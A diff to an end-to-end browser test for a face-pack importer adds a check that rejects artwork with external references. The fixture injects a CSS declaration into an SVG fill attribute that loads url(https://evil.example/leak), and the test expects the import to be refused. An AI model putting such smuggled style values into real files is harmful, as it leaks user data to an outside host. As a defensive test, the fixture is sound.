@@ -925,6 +925,9 @@ test('@critical a face pack imported from a file puts its parts and presets in t
   await expect(page.locator('#toast')).toContainText('Face pack refused: Not a face pack');
   await importPack('bad.json', { ...pack, presets: [{ id: 'grinning', name: 'Grinning', parts: { mouth: 'mouth.nope' } }] });
   await expect(page.locator('#toast')).toContainText('There is no asset called "mouth.nope"');
+  // A paint reaching outside the document -- a colour with a declaration smuggled after it -- is refused at the door.
+  await importPack('hostile.json', { ...pack, presets: [], parts: [{ ...pack.parts[0], artwork: pack.parts[0].artwork.replace('<g ', '<g fill="#fff;background:url(https://evil.example/leak)" ') }] });
+  await expect(page.locator('#toast')).toContainText('external reference');
   await openCharacter(page);
   await page.locator('[data-part-category="mouth"]').click();
   await expect(page.locator('[data-face-part]').first()).toBeVisible();
